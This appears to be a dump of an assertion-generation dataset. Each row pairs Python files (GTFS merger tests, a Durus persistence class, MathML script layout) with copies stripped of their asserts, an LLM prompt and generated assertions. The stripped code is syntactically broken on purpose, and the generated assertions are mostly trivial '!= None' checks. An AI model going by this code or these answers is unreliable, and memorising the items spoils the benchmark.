        'parent_station'].tolist() == [
            '0-n1502', '0-n62046', '0-n1520', '0-n1522']

    assert pd.isnull(gtfs_merger_from_bytes.merged['stops'].iloc[5][
        'parent_station'])

    z_p = gtfs_merger_from_bytes.get_zipfile()

    assert gtfs_merger_from_bytes.merged['calendar_dates'][
        'date'].dtype == np.dtype('<M8[ns]')

    assert set(z_p.namelist()) == set([
        'agency.txt',
        'stop_times.txt',
        'stops.txt',
        'shapes.txt',
        'calendar_dates.txt',
        'routes.txt',
        'trips.txt'])


def test_mod_ids(gtfs_obj):
    gtfs_merger = GTFSMerger()
    gtfs_merger.gtfs_tables = {'stops'}
    gtfs_merger.mod_ids(100, gtfs_obj)
    assert gtfs_obj['stops'].iloc[:5]['stop_id'].tolist() == [
        u'100-n1502-1',
        u'100-n62046-1',
        u'100-n1520-1',
        u'100-n1522-1',
        u'100-n1510']


@pytest.mark.parametrize('tag,in_series,out_series', [
    (0, pd.Series(), pd.Series()),
    (0, pd.Series({0: 'a', 1: 'b', 3: 'd'}, index=[0, 1, 2, 3]),
     pd.Series({0: '0-a', 1: '0-b', 3: '0-d'}, index=[0, 1, 2, 3])),
    (0, pd.Series({0: 1, 1: 2, 3: 4}, index=[0, 1, 2, 3]),
     pd.Series({0: '0-1.0', 1: '0-2.0', 3: '0-4.0'}, index=[0, 1, 2, 3])),
])
def test_tag_series(tag, in_series, out_series):
    result = GTFSMerger.tag_series(tag, in_series)
    print(in_series.dtypes)
    tm.assert_series_equal(result, out_series)
","
1from gtfsmerger import GTFSMerger
2import pandas as pd
3from pandas.util import testing as tm
4import numpy as np
5import pytest
6
7
8def test_gtfs_merger(gtfs_merger):
9        u'0-n1502-1',
10        u'0-n62046-1',
11        u'0-n1520-1',
12        u'0-n1522-1',
13        u'0-n1510']
14
15        '0-n1502', '0-n62046', '0-n1520', '0-n1522']
16
17        'parent_station'])
18
19    z_p = gtfs_merger.get_zipfile()
20
21        'date'].dtype == np.dtype('<M8[ns]')
22
23        'agency.txt',
24        'stop_times.txt',
25        'stops.txt',
26        'shapes.txt',
27        'calendar_dates.txt',
28        'routes.txt',
29        'trips.txt'])
30
31
32def test_gtfs_merger_from_bytes(gtfs_merger_from_bytes):
33        'stops'].iloc[:5]['stop_id'].tolist() == [
34            u'0-n1502-1',
35            u'0-n62046-1',
36            u'0-n1520-1',
37            u'0-n1522-1',
38            u'0-n1510']
39
40        'parent_station'].tolist() == [
41            '0-n1502', '0-n62046', '0-n1520', '0-n1522']
42
43        'parent_station'])
44
45    z_p = gtfs_merger_from_bytes.get_zipfile()
46
47        'date'].dtype == np.dtype('<M8[ns]')
48
49        'agency.txt',
50        'stop_times.txt',
51        'stops.txt',
52        'shapes.txt',
53        'calendar_dates.txt',
54        'routes.txt',
55        'trips.txt'])
56
57
58def test_mod_ids(gtfs_obj):
59    gtfs_merger = GTFSMerger()
60    gtfs_merger.gtfs_tables = {'stops'}
61    gtfs_merger.mod_ids(100, gtfs_obj)
62        u'100-n1502-1',
63        u'100-n62046-1',
64        u'100-n1520-1',
65        u'100-n1522-1',
66        u'100-n1510']
67
68
69@pytest.mark.parametrize('tag,in_series,out_series', [
70    (0, pd.Series(), pd.Series()),
71    (0, pd.Series({0: 'a', 1: 'b', 3: 'd'}, index=[0, 1, 2, 3]),
72     pd.Series({0: '0-a', 1: '0-b', 3: '0-d'}, index=[0, 1, 2, 3])),
73    (0, pd.Series({0: 1, 1: 2, 3: 4}, index=[0, 1, 2, 3]),
74     pd.Series({0: '0-1.0', 1: '0-2.0', 3: '0-4.0'}, index=[0, 1, 2, 3])),
75])
76def test_tag_series(tag, in_series, out_series):
77    result = GTFSMerger.tag_series(tag, in_series)
78    print(in_series.dtypes)
79","[[""gtfs_merger.merged['stops'].iloc[:5]['stop_id'].tolist()"", '==', '['], [""gtfs_merger.merged['stops'].iloc[:4]['parent_station'].tolist()"", '==', '['], [""pd.isnull(gtfs_merger.merged['stops'].iloc[5]["", '==', 'True'], [""gtfs_merger.merged['calendar_dates']["", '==', 'True'], ['set(z_p.namelist())', '==', 'set(['], ['gtfs_merger_from_bytes.merged[', '==', 'True'], [""gtfs_merger_from_bytes.merged['stops'].iloc[:4]["", '==', 'True'], [""pd.isnull(gtfs_merger_from_bytes.merged['stops'].iloc[5]["", '==', 'True'], [""gtfs_merger_from_bytes.merged['calendar_dates']["", '==', 'True'], ['set(z_p.namelist())', '==', 'set(['], [""gtfs_obj['stops'].iloc[:5]['stop_id'].tolist()"", '==', '[']]",12,11,0.9166666666666666,0.0041384499623777,"['gtfs_merger', 'z_p', 'gtfs_merger_from_bytes', 'gtfs_obj', 'gtfs_merger.gtfs_tables', 'tag', 'in_series', 'out_series', 'result']",9,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['gtfs_merger', 'z_p', 'gtfs_merger_from_bytes', 'gtfs_obj', 'gtfs_merger.gtfs_tables', 'tag', 'in_series', 'out_series', 'result']
*Code:

1from gtfsmerger import GTFSMerger
2import pandas as pd
3from pandas.util import testing as tm
4import numpy as np
5import pytest
6
7
8def test_gtfs_merger(gtfs_merger):
9        u'0-n1502-1',
10        u'0-n62046-1',
11        u'0-n1520-1',
12        u'0-n1522-1',
13        u'0-n1510']
14
15        '0-n1502', '0-n62046', '0-n1520', '0-n1522']
16
17        'parent_station'])
18
19    z_p = gtfs_merger.get_zipfile()
20
21        'date'].dtype == np.dtype('<M8[ns]')
22
23        'agency.txt',
24        'stop_times.txt',
25        'stops.txt',
26        'shapes.txt',
27        'calendar_dates.txt',
28        'routes.txt',
29        'trips.txt'])
30
31
32def test_gtfs_merger_from_bytes(gtfs_merger_from_bytes):
33        'stops'].iloc[:5]['stop_id'].tolist() == [
34            u'0-n1502-1',
35            u'0-n62046-1',
36            u'0-n1520-1',
37            u'0-n1522-1',
38            u'0-n1510']
39
40        'parent_station'].tolist() == [
41            '0-n1502', '0-n62046', '0-n1520', '0-n1522']
42
43        'parent_station'])
44
45    z_p = gtfs_merger_from_bytes.get_zipfile()
46
47        'date'].dtype == np.dtype('<M8[ns]')
48
49        'agency.txt',
50        'stop_times.txt',
51        'stops.txt',
52        'shapes.txt',
53        'calendar_dates.txt',
54        'routes.txt',
55        'trips.txt'])
56
57
58def test_mod_ids(gtfs_obj):
59    gtfs_merger = GTFSMerger()
60    gtfs_merger.gtfs_tables = {'stops'}
61    gtfs_merger.mod_ids(100, gtfs_obj)
62        u'100-n1502-1',
63        u'100-n62046-1',
64        u'100-n1520-1',
65        u'100-n1522-1',
66        u'100-n1510']
67
68
69@pytest.mark.parametrize('tag,in_series,out_series', [
70    (0, pd.Series(), pd.Series()),
71    (0, pd.Series({0: 'a', 1: 'b', 3: 'd'}, index=[0, 1, 2, 3]),
72     pd.Series({0: '0-a', 1: '0-b', 3: '0-d'}, index=[0, 1, 2, 3])),
73    (0, pd.Series({0: 1, 1: 2, 3: 4}, index=[0, 1, 2, 3]),
74     pd.Series({0: '0-1.0', 1: '0-2.0', 3: '0-4.0'}, index=[0, 1, 2, 3])),
75])
76def test_tag_series(tag, in_series, out_series):
77    result = GTFSMerger.tag_series(tag, in_series)
78    print(in_series.dtypes)
79",3638,"[[8, 'gtfs_merger', '!=', None, 'gtfs_merger should not be None for the test'],
[32, 'gtfs_merger_from_bytes', '!=', None, 'gtfs_merger_from_bytes should not be None for the test'],
[58,'gtfs_obj', '!=', None, 'gtfs_obj should not be None for the test'],
[76, 'tag', '!=', None, 'tag should not be None for the test'],
[76, 'in_series', '!=', None, 'in_series should not be None for the test'],
[76, 'out_series', '!=', None, 'out_series should not be None for the test']]"
xiangke/pycopia,"#!/usr/bin/python2.4
# vim:ts=4:sw=4:softtabstop=4:smarttab:expandtab
# 
# $Id$
#
#    Copyright (C) 1999-2006  Keith Dart <keith@kdart.com>
#
#    This library is free software; you can redistribute it and/or
#    modify it under the terms of the GNU Lesser General Public
#    License as published by the Free Software Foundation; either
#    version 2.1 of the License, or (at your option) any later version.
#
#    This library is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
#    Lesser General Public License for more details.

""""""$URL$
$Id$
""""""
# vim:ts=4:sw=4:softtabstop=4:smarttab:expandtab

# Support Persistent data with type enforcement and default values for attributes.

import durus.persistent as persistent

MANDATORY = ""Mandatory""
CONTAINER = ""CONTAINER""

class PersistentData(persistent.Persistent):
    _ATTRS = {}
    MANDATORY = MANDATORY
    CONTAINER = CONTAINER
    def __init__(self, **kwargs):
        super(PersistentData, self).__init__()
        for aname, (typ, default) in self.__class__._ATTRS.items():
            if aname in kwargs:
                value = kwargs[aname]
                if value is not None:
                    value = typ(value)
                super(PersistentData, self).__setattr__(aname, value)
            else:
                if default is MANDATORY:
                    raise ValueError, ""mandatory attribute %r not provided."" % (aname,)
                elif default is CONTAINER: # created empty first time
                    super(PersistentData, self).__setattr__(aname, typ())
                elif default is not None: # no default
                    super(PersistentData, self).__setattr__(aname, default)
        self.__dict__[""_cache""] = {}

    def __repr__(self):
        s = [""%s("" % (self.__class__.__name__,)]
        for aname, (typ, default) in self.__class__._ATTRS.items():
            s.append(""%s=%s(%r), "" % (aname, typ.__name__, getattr(self, aname, default)))
        s.append("")"")
        return """".join(s)

    def __str__(self):
        return ""<%s>"" % (self.__class__.__name__,)

    def __getattribute__(self, name):
        try:
            return super(PersistentData, self).__getattribute__(name)
        except AttributeError, err:
            typ, default = self.__class__._ATTRS.get(name, (None, None))
            if typ is not None:
                return default
            raise

    def __setattr__(self, name, value):
        typ, default = self.__class__._ATTRS.get(name, (None, None))
        if typ is not None and value is not None:
            if typ in (int, long, float, str, unicode):
                value = typ(value)
            else:
                assert issubclass(type(value), typ), ""PersistentData: wrong type for attribute %r!"" % name
        super(PersistentData, self).__setattr__(name, value)

    def _get_cache(self, name, constructor):
        try:
            return self.__dict__[""_cache""][name]
        except KeyError:
            obj = constructor()
            self.__dict__[""_cache""][name] = obj
            return obj

    def _del_cache(self, name, destructor=None):
        try:
            obj = self.__dict__[""_cache""].pop(name)
        except KeyError:
            return
        else:
            if destructor:
                destructor(obj)

    def clear_cache(self):
        self.__dict__[""_cache""].clear()

","
1#!/usr/bin/python2.4
2# vim:ts=4:sw=4:softtabstop=4:smarttab:expandtab
3# 
4# $Id$
5#
6#    Copyright (C) 1999-2006  Keith Dart <keith@kdart.com>
7#
8#    This library is free software; you can redistribute it and/or
9#    modify it under the terms of the GNU Lesser General Public
10#    License as published by the Free Software Foundation; either
11#    version 2.1 of the License, or (at your option) any later version.
12#
13#    This library is distributed in the hope that it will be useful,
14#    but WITHOUT ANY WARRANTY; without even the implied warranty of
15#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
16#    Lesser General Public License for more details.
17
18""""""$URL$
19$Id$
20""""""
21# vim:ts=4:sw=4:softtabstop=4:smarttab:expandtab
22
23# Support Persistent data with type enforcement and default values for attributes.
24
25import durus.persistent as persistent
26
27MANDATORY = ""Mandatory""
28CONTAINER = ""CONTAINER""
29
30class PersistentData(persistent.Persistent):
31    _ATTRS = {}
32    MANDATORY = MANDATORY
33    CONTAINER = CONTAINER
34    def __init__(self, **kwargs):
35        super(PersistentData, self).__init__()
36        for aname, (typ, default) in self.__class__._ATTRS.items():
37            if aname in kwargs:
38                value = kwargs[aname]
39                if value is not None:
40                    value = typ(value)
41                super(PersistentData, self).__setattr__(aname, value)
42            else:
43                if default is MANDATORY:
44                    raise ValueError, ""mandatory attribute %r not provided."" % (aname,)
45                elif default is CONTAINER: # created empty first time
46                    super(PersistentData, self).__setattr__(aname, typ())
47                elif default is not None: # no default
48                    super(PersistentData, self).__setattr__(aname, default)
49        self.__dict__[""_cache""] = {}
50
51    def __repr__(self):
52        s = [""%s("" % (self.__class__.__name__,)]
53        for aname, (typ, default) in self.__class__._ATTRS.items():
54            s.append(""%s=%s(%r), "" % (aname, typ.__name__, getattr(self, aname, default)))
55        s.append("")"")
56        return """".join(s)
57
58    def __str__(self):
59        return ""<%s>"" % (self.__class__.__name__,)
60
61    def __getattribute__(self, name):
62        try:
63            return super(PersistentData, self).__getattribute__(name)
64        except AttributeError, err:
65            typ, default = self.__class__._ATTRS.get(name, (None, None))
66            if typ is not None:
67                return default
68            raise
69
70    def __setattr__(self, name, value):
71        typ, default = self.__class__._ATTRS.get(name, (None, None))
72        if typ is not None and value is not None:
73            if typ in (int, long, float, str, unicode):
74                value = typ(value)
75            else:
76        super(PersistentData, self).__setattr__(name, value)
77
78    def _get_cache(self, name, constructor):
79        try:
80            return self.__dict__[""_cache""][name]
81        except KeyError:
82            obj = constructor()
83            self.__dict__[""_cache""][name] = obj
84            return obj
85
86    def _del_cache(self, name, destructor=None):
87        try:
88            obj = self.__dict__[""_cache""].pop(name)
89        except KeyError:
90            return
91        else:
92            if destructor:
93                destructor(obj)
94
95    def clear_cache(self):
96        self.__dict__[""_cache""].clear()
97
98","[['issubclass(type(value)', '==', 'True']]",1,1,1.0,0.0002860411899313,"['MANDATORY', 'CONTAINER', '_ATTRS', '**kwargs', 'value', 'self.__dict__[""_cache""]', 's', 'name', 'typ', 'default', 'constructor', 'obj', 'self.__dict__[""_cache""][name]', 'destructor']",14,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['MANDATORY', 'CONTAINER', '_ATTRS', '**kwargs', 'value', 'self.__dict__[""_cache""]', 's', 'name', 'typ', 'default', 'constructor', 'obj', 'self.__dict__[""_cache""][name]', 'destructor']
*Code:

1#!/usr/bin/python2.4
2# vim:ts=4:sw=4:softtabstop=4:smarttab:expandtab
3# 
4# $Id$
5#
6#    Copyright (C) 1999-2006  Keith Dart <keith@kdart.com>
7#
8#    This library is free software; you can redistribute it and/or
9#    modify it under the terms of the GNU Lesser General Public
10#    License as published by the Free Software Foundation; either
11#    version 2.1 of the License, or (at your option) any later version.
12#
13#    This library is distributed in the hope that it will be useful,
14#    but WITHOUT ANY WARRANTY; without even the implied warranty of
15#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
16#    Lesser General Public License for more details.
17
18""""""$URL$
19$Id$
20""""""
21# vim:ts=4:sw=4:softtabstop=4:smarttab:expandtab
22
23# Support Persistent data with type enforcement and default values for attributes.
24
25import durus.persistent as persistent
26
27MANDATORY = ""Mandatory""
28CONTAINER = ""CONTAINER""
29
30class PersistentData(persistent.Persistent):
31    _ATTRS = {}
32    MANDATORY = MANDATORY
33    CONTAINER = CONTAINER
34    def __init__(self, **kwargs):
35        super(PersistentData, self).__init__()
36        for aname, (typ, default) in self.__class__._ATTRS.items():
37            if aname in kwargs:
38                value = kwargs[aname]
39                if value is not None:
40                    value = typ(value)
41                super(PersistentData, self).__setattr__(aname, value)
42            else:
43                if default is MANDATORY:
44                    raise ValueError, ""mandatory attribute %r not provided."" % (aname,)
45                elif default is CONTAINER: # created empty first time
46                    super(PersistentData, self).__setattr__(aname, typ())
47                elif default is not None: # no default
48                    super(PersistentData, self).__setattr__(aname, default)
49        self.__dict__[""_cache""] = {}
50
51    def __repr__(self):
52        s = [""%s("" % (self.__class__.__name__,)]
53        for aname, (typ, default) in self.__class__._ATTRS.items():
54            s.append(""%s=%s(%r), "" % (aname, typ.__name__, getattr(self, aname, default)))
55        s.append("")"")
56        return """".join(s)
57
58    def __str__(self):
59        return ""<%s>"" % (self.__class__.__name__,)
60
61    def __getattribute__(self, name):
62        try:
63            return super(PersistentData, self).__getattribute__(name)
64        except AttributeError, err:
65            typ, default = self.__class__._ATTRS.get(name, (None, None))
66            if typ is not None:
67                return default
68            raise
69
70    def __setattr__(self, name, value):
71        typ, default = self.__class__._ATTRS.get(name, (None, None))
72        if typ is not None and value is not None:
73            if typ in (int, long, float, str, unicode):
74                value = typ(value)
75            else:
76        super(PersistentData, self).__setattr__(name, value)
77
78    def _get_cache(self, name, constructor):
79        try:
80            return self.__dict__[""_cache""][name]
81        except KeyError:
82            obj = constructor()
83            self.__dict__[""_cache""][name] = obj
84            return obj
85
86    def _del_cache(self, name, destructor=None):
87        try:
88            obj = self.__dict__[""_cache""].pop(name)
89        except KeyError:
90            return
91        else:
92            if destructor:
93                destructor(obj)
94
95    def clear_cache(self):
96        self.__dict__[""_cache""].clear()
97
98",5141,"[[34, '**kwargs', '!=', None, 'function arguments must be provided'],
 [71, 'value', '!=', None, 'value should not be None'],
 [76, 'value', '!=', None, 'value should not be None'],
 [79, 'name', '!=', None, 'name should not be None'],
 [86, 'name', '!=', None, 'name should not be None']]"
ahjulstad/mathdom-python3,"from .element import *
import warnings
from . import munderover

_SUB_MAX_POSITION          = 1/3.0 # relative to the base height
_SUP_MIN_POSITION          = 2/3.0 # relative to the base height
_SUBSUP_MIN_DISTANCE       = 1/3.0 # relative to base's font size
_SCRIPT_HORIZONTAL_SPACING = 0.02  # relative to base's font size



class MSup(Element):

    class Strategy:

	def modify_children(elem, base, sup):
	    sup.setAttributeWeak(""scriptlevel"",  ""+1"")
	    sup.setAttributeWeak(""displaystyle"", ""false"")

	modify_children = staticmethod(modify_children)

	def layout(elem, base, sup):
	    base.x0 = 0
	    base.y0 = 0
	    sup.x0 = base.width + base.font_size*_SCRIPT_HORIZONTAL_SPACING
	    sup.y0 = max(base.height*_SUP_MIN_POSITION,
			 base.height - sup.axis)
	    elem.height = max(sup.y0 + sup.height, base.height)
	    elem.width = sup.x0 + sup.width
	    elem.axis = base.axis

	layout = staticmethod(layout)

    
    def __init__(self, plotter, children):
	assert len(children) == 2
	Element.__init__(self, plotter)
	for child in children:
	    self.addChild(child)

    def update(self):
	assert len(self.children) == 2
	base, sup = self.children

	## Honor attribute 'movablelimits'
	base.update()
	if (base.embellished_core is not None
	    and base.embellished_core.getAttribute(""movablelimits"",
						   recursive=False,
						   default=False)
	    and self.getAttribute(""displaystyle"").bool):
	    strategy = munderover.MOver.Strategy
	else:
	    strategy = self.Strategy

	strategy.modify_children(self, base, sup)
	sup.update()
	strategy.layout(self, base, sup)

    def embellished_p(self):
	try:
	    return self.children[0].embellished_p()
	except IndexError:
	    return None

class MSub(Element):

    class Strategy:

	def modify_children(elem, base, sub):
	    sub.setAttributeWeak(""scriptlevel"",  ""+1"")
	    sub.setAttributeWeak(""displaystyle"", ""false"")

	modify_children = staticmethod(modify_children)

	def layout(elem, base, sub):
	    base.x0 = 0
	    sub.x0 = base.width + base.font_size*_SCRIPT_HORIZONTAL_SPACING
	    sub.y0 = min(base.height*_SUB_MAX_POSITION - sub.height, -sub.axis)
	    base.y0 = -sub.y0
	    sub.y0  = 0
	    elem.height = max(sub.height, base.y0 + base.height)
	    elem.width = sub.x0 + sub.width
	    elem.axis = base.y0 + base.axis

	layout = staticmethod(layout)

    
    def __init__(self, plotter, children):
	assert len(children) == 2
	Element.__init__(self, plotter)
	for child in children:
	    self.addChild(child)

    def update(self):
	assert len(self.children) == 2
	base, sub = self.children

	## Honor attribute 'movablelimits'
	base.update()
	if (base.embellished_core is not None
	    and base.embellished_core.getAttribute(""movablelimits"",
						   recursive=False,
						   default=False)
	    and self.getAttribute(""displaystyle"").bool):
	    strategy = munderover.MUnder.Strategy
	else:
	    strategy = self.Strategy

	strategy.modify_children(self, base, sub)
	sub.update()
	strategy.layout(self, base, sub)
	
    def embellished_p(self):
	try:
	    return self.children[0].embellished_p()
	except IndexError:
	    return None

class MSubSup(Element):

    class Strategy:

	def modify_children(element, base, sub, sup):
	    for elem in sub, sup:
		elem.setAttributeWeak(""scriptlevel"",  ""+1"")
		elem.setAttributeWeak(""displaystyle"", ""false"")

	modify_children = staticmethod(modify_children)

	def layout(elem, base, sub, sup):
	    base.x0 = 0

	    # we assume initially that base.y0 = 0

	    sub.x0 = base.width + base.font_size*_SCRIPT_HORIZONTAL_SPACING
	    sub.y0 = min(base.height*_SUB_MAX_POSITION - sub.height, -sub.axis)

	    sup.x0 = sub.x0
	    sup.y0 = max(base.height*_SUP_MIN_POSITION,
			 base.height - sup.axis)

	    # then we offset all coordinates so that sub.y0 = 0
	    base.y0  = -sub.y0
	    sup.y0  -= sub.y0
	    sub.y0   = 0

	    # make sure the subscript and superscript are separated by
	    # a minimum distance
	    mindist = _SUBSUP_MIN_DISTANCE*base.font_size
	    dist = sup.y0 - (sub.y0 + sub.height)
	    if dist < mindist:
		delta = (mindist - dist)/2
		sub.y0 -= delta
		sup.y0 += delta

	    elem.height = max(sup.y0 + sup.height, base.y0 + base.height)
	    elem.width = sub.x0 + max(sub.width, sup.width)
	    elem.axis = base.y0 + base.axis

	layout = staticmethod(layout)
    
    def __init__(self, plotter, children):
	assert len(children) == 3
	Element.__init__(self, plotter)
	for child in children:
	    self.addChild(child)

    def update(self):
	assert len(self.children) == 3
	base, sub, sup = self.children

	## Honor attribute 'movablelimits'
	base.update()
	if (base.embellished_core is not None
	    and base.embellished_core.getAttribute(""movablelimits"",
						   recursive=False,
						   default=False)
	    and self.getAttribute(""displaystyle"").bool):
	    strategy = munderover.MUnderOver.Strategy
	else:
	    strategy = self.Strategy

	strategy.modify_children(self, base, sub, sup)
	sub.update()
	sup.update()
	strategy.layout(self, base, sub, sup)

    def embellished_p(self):
	try:
	    return self.children[0].embellished_p()
	except IndexError:
	    return None


xml_mapping['msup']    = MSup
xml_mapping['msub']    = MSub
xml_mapping['msubsup'] = MSubSup

","
1from .element import *
2import warnings
3from . import munderover
4
5_SUB_MAX_POSITION          = 1/3.0 # relative to the base height
6_SUP_MIN_POSITION          = 2/3.0 # relative to the base height
7_SUBSUP_MIN_DISTANCE       = 1/3.0 # relative to base's font size
8_SCRIPT_HORIZONTAL_SPACING = 0.02  # relative to base's font size
9
10
11
12class MSup(Element):
13
14    class Strategy:
15
16	def modify_children(elem, base, sup):
17	    sup.setAttributeWeak(""scriptlevel"",  ""+1"")
18	    sup.setAttributeWeak(""displaystyle"", ""false"")
19
20	modify_children = staticmethod(modify_children)
21
22	def layout(elem, base, sup):
23	    base.x0 = 0
24	    base.y0 = 0
25	    sup.x0 = base.width + base.font_size*_SCRIPT_HORIZONTAL_SPACING
26	    sup.y0 = max(base.height*_SUP_MIN_POSITION,
27			 base.height - sup.axis)
28	    elem.height = max(sup.y0 + sup.height, base.height)
29	    elem.width = sup.x0 + sup.width
30	    elem.axis = base.axis
31
32	layout = staticmethod(layout)
33
34    
35    def __init__(self, plotter, children):
36	Element.__init__(self, plotter)
37	for child in children:
38	    self.addChild(child)
39
40    def update(self):
41	base, sup = self.children
42
43	## Honor attribute 'movablelimits'
44	base.update()
45	if (base.embellished_core is not None
46	    and base.embellished_core.getAttribute(""movablelimits"",
47						   recursive=False,
48						   default=False)
49	    and self.getAttribute(""displaystyle"").bool):
50	    strategy = munderover.MOver.Strategy
51	else:
52	    strategy = self.Strategy
53
54	strategy.modify_children(self, base, sup)
55	sup.update()
56	strategy.layout(self, base, sup)
57
58    def embellished_p(self):
59	try:
60	    return self.children[0].embellished_p()
61	except IndexError:
62	    return None
63
64class MSub(Element):
65
66    class Strategy:
67
68	def modify_children(elem, base, sub):
69	    sub.setAttributeWeak(""scriptlevel"",  ""+1"")
70	    sub.setAttributeWeak(""displaystyle"", ""false"")
71
72	modify_children = staticmethod(modify_children)
73
74	def layout(elem, base, sub):
75	    base.x0 = 0
76	    sub.x0 = base.width + base.font_size*_SCRIPT_HORIZONTAL_SPACING
77	    sub.y0 = min(base.height*_SUB_MAX_POSITION - sub.height, -sub.axis)
78	    base.y0 = -sub.y0
79	    sub.y0  = 0
80	    elem.height = max(sub.height, base.y0 + base.height)
81	    elem.width = sub.x0 + sub.width
82	    elem.axis = base.y0 + base.axis
83
84	layout = staticmethod(layout)
85
86    
87    def __init__(self, plotter, children):
88	Element.__init__(self, plotter)
89	for child in children:
90	    self.addChild(child)
91
92    def update(self):
93	base, sub = self.children
94
95	## Honor attribute 'movablelimits'
96	base.update()
97	if (base.embellished_core is not None
98	    and base.embellished_core.getAttribute(""movablelimits"",
99						   recursive=False,
100						   default=False)
101	    and self.getAttribute(""displaystyle"").bool):
102	    strategy = munderover.MUnder.Strategy
103	else:
104	    strategy = self.Strategy
105
106	strategy.modify_children(self, base, sub)
107	sub.update()
108	strategy.layout(self, base, sub)
109	
110    def embellished_p(self):
111	try:
112	    return self.children[0].embellished_p()
113	except IndexError:
114	    return None
115
116class MSubSup(Element):
117
118    class Strategy:
119
120	def modify_children(element, base, sub, sup):
121	    for elem in sub, sup:
122		elem.setAttributeWeak(""scriptlevel"",  ""+1"")
123		elem.setAttributeWeak(""displaystyle"", ""false"")
124
125	modify_children = staticmethod(modify_children)
126
127	def layout(elem, base, sub, sup):
128	    base.x0 = 0
129
130	    # we assume initially that base.y0 = 0
131
132	    sub.x0 = base.width + base.font_size*_SCRIPT_HORIZONTAL_SPACING
133	    sub.y0 = min(base.height*_SUB_MAX_POSITION - sub.height, -sub.axis)
134
135	    sup.x0 = sub.x0
136	    sup.y0 = max(base.height*_SUP_MIN_POSITION,
137			 base.height - sup.axis)
138
139	    # then we offset all coordinates so that sub.y0 = 0
140	    base.y0  = -sub.y0
141	    sup.y0  -= sub.y0
142	    sub.y0   = 0
143
144	    # make sure the subscript and superscript are separated by
145	    # a minimum distance
146	    mindist = _SUBSUP_MIN_DISTANCE*base.font_size
147	    dist = sup.y0 - (sub.y0 + sub.height)
148	    if dist < mindist:
149		delta = (mindist - dist)/2
150		sub.y0 -= delta
151		sup.y0 += delta
152
153	    elem.height = max(sup.y0 + sup.height, base.y0 + base.height)
154	    elem.width = sub.x0 + max(sub.width, sup.width)
155	    elem.axis = base.y0 + base.axis
156
157	layout = staticmethod(layout)
158    
159    def __init__(self, plotter, children):
160	Element.__init__(self, plotter)
161	for child in children:
162	    self.addChild(child)
163
164    def update(self):
165	base, sub, sup = self.children
166
167	## Honor attribute 'movablelimits'
168	base.update()
169	if (base.embellished_core is not None
170	    and base.embellished_core.getAttribute(""movablelimits"",
171						   recursive=False,
172						   default=False)
173	    and self.getAttribute(""displaystyle"").bool):
174	    strategy = munderover.MUnderOver.Strategy
175	else:
176	    strategy = self.Strategy
177
178	strategy.modify_children(self, base, sub, sup)
179	sub.update()
180	sup.update()
181	strategy.layout(self, base, sub, sup)
182
183    def embellished_p(self):
184	try:
185	    return self.children[0].embellished_p()
186	except IndexError:
187	    return None
188
189
190xml_mapping['msup']    = MSup
191xml_mapping['msub']    = MSub
192xml_mapping['msubsup'] = MSubSup
193
194","[['len(children)', '==', '2'], ['len(self.children)', '==', '2'], ['len(children)', '==', '2'], ['len(self.children)', '==', '2'], ['len(children)', '==', '3'], ['len(self.children)', '==', '3']]",6,6,1.0,0.0011492051331162,"['_SUB_MAX_POSITION', '_SUP_MIN_POSITION', '_SUBSUP_MIN_DISTANCE', '_SCRIPT_HORIZONTAL_SPACING', 'elem', 'base', 'sup', 'modify_children', 'base.x0', 'base.y0', 'sup.x0', 'sup.y0', 'elem.height', 'elem.width', 'elem.axis', 'layout', 'plotter', 'children', 'strategy', 'sub', 'sub.x0', 'sub.y0', 'element', '# we assume initially that base.y0', '# then we offset all coordinates so that sub.y0', 'mindist', 'dist', 'delta', ""xml_mapping['msup']"", ""xml_mapping['msub']"", ""xml_mapping['msubsup']""]",31,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
